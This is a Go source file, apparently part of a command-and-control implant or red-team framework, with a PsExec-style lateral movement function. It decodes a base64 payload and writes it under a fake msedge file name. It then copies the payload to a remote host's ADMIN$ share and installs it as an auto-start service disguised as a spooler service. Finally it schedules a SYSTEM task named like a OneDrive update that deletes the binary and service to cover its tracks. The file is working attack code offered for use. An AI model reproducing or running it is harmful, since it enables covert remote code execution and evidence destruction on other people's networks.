package execution

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

func randomHex(n int) string {
	b := make([]byte, n)
	_, _ = io.ReadFull(rand.Reader, b)
	return hex.EncodeToString(b)[:n]
}

func cleanRemoteArtifacts(server, binPath, serviceName string) {
	cleanupCmd := fmt.Sprintf(
		`schtasks /create /S %s /TN "OneDriveUpdate_%s" /TR "cmd /c del /f %s && sc delete %s" /ST %s /RU SYSTEM /F`,
		server,
		randomHex(4),
		binPath,
		serviceName,
		time.Now().Add(5*time.Minute).Format("15:04"),
	)
	_ = exec.Command("cmd", "/C", cleanupCmd).Run()
}

func JumpPsExec(encodedSrcFile, server string) string {
	serviceName := "SpoolerSvc_" + randomHex(6)
	binName := serviceName + ".exe"
	decodedData, err := base64.StdEncoding.DecodeString(encodedSrcFile)
	if err != nil {
		return fmt.Sprintf("[!] Decode failed: %v", err)
	}

	tempDir := "C:\\ProgramData"
	localFile := filepath.Join(tempDir, fmt.Sprintf("msedge_%d.exe", time.Now().UnixNano()))
	if err := os.WriteFile(localFile, decodedData, 0644); err != nil {
		return fmt.Sprintf("[!] Temp file write failed: %v", err)
	}
	defer os.Remove(localFile)

	copyCmd := fmt.Sprintf(
		`Copy-Item -Path "%s" -Destination "\\%s\ADMIN$\%s" -Force`,
		localFile, server, binName,
	)
	if out, err := exec.Command("powershell", "-Command", copyCmd).CombinedOutput(); err != nil {
		return fmt.Sprintf("[!] Copy failed: %v\nOutput: %s", err, out)
	}

	remoteBinPath := fmt.Sprintf(`C:\Windows\%s`, binName)

	createCmd := fmt.Sprintf(`sc \\%s create "%s" binPath= "C:\Windows\%s" start= auto`, server, serviceName, binName)
	if out, err := exec.Command("cmd", "/C", createCmd).CombinedOutput(); err != nil {
		return fmt.Sprintf("[!] Service create failed: %v\nOutput: %s", err, out)
	}

	startCmd := fmt.Sprintf(`sc \\%s start "%s"`, server, serviceName)
	if out, err := exec.Command("cmd", "/C", startCmd).CombinedOutput(); err != nil {
		return fmt.Sprintf("[!] Service start failed: %v\nOutput: %s", err, out)
	}

	cleanRemoteArtifacts(server, remoteBinPath, serviceName)

	return fmt.Sprintf("[+] PsExec completed on %s (service: %s)", server, serviceName)
}

